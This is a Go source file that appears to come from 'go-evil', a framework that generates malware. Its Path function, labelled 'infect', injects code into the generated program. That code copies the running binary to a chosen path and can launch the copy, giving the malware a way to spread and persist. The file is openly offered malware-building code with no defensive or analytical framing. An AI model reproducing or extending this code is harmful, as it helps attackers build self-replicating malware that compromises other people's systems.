package path

import (
	"fmt"
	"strings"

	gotools "github.com/DennisTheodoreNedry/Go-tools"
	"github.com/DennisTheodoreNedry/go-evil/utility/structure"
	"github.com/DennisTheodoreNedry/go-evil/utility/structure/functions"
	"github.com/DennisTheodoreNedry/go-evil/utility/structure/json"
	notify "github.com/DennisTheodoreNedry/notify_handler"
)

// Places a copy in the provided path
// Requires an evil array with the following format
// 1 - Path to infect, MUST end with the name that the copy will have
// 2 - Should the copy be booted once the process is done? (true/false)
func Path(value string, data_object *json.Json_t) []string {
	function_call := "infect_path"
	arr := structure.Create_evil_object(value)

	if arr.Length() != 2 {
		notify.Error(fmt.Sprintf("Expected two values, but recieved %d", arr.Length()), "infect.path()", 1)
	}

	path := arr.Get(0)
	boot := gotools.StringToBoolean(strings.ToLower(arr.Get(1)))

	data_object.Add_go_function(functions.Go_func_t{Name: function_call, Func_type: "", Part_of_struct: "", Return_type: "",
		Parameters: []string{"repr_1 []int", "auto_boot bool"},
		Gut: []string{
			"path := spine.variable.get(spine.alpha.construct_string(repr_1))",
			"src, err := os.Open(spine.path)",
			"if err != nil{",
			"spine.log(err.Error())",
			"}",
			"dst, err := os.Create(path)",
			"if err != nil{",
			"spine.log(err.Error())",
			"}",
			"_, err = io.Copy(dst, src)",
			"if err != nil{",
			"spine.log(err.Error())",
			"}",
			"if auto_boot{",
			"err = exec.Command(fmt.Sprintf(\"%s\", path)).Run()",
			"if err != nil{",
			"spine.log(err.Error())",
			"}",
			"}",
		}})

	data_object.Add_go_import("os")
	data_object.Add_go_import("io")
	data_object.Add_go_import("os/exec")
	data_object.Add_go_import("github.com/DennisTheodoreNedry/notify_handler")

	parameter_1 := data_object.Generate_int_array_parameter(path)

	return []string{fmt.Sprintf("%s(%s, %t)", function_call, parameter_1, boot)}
}
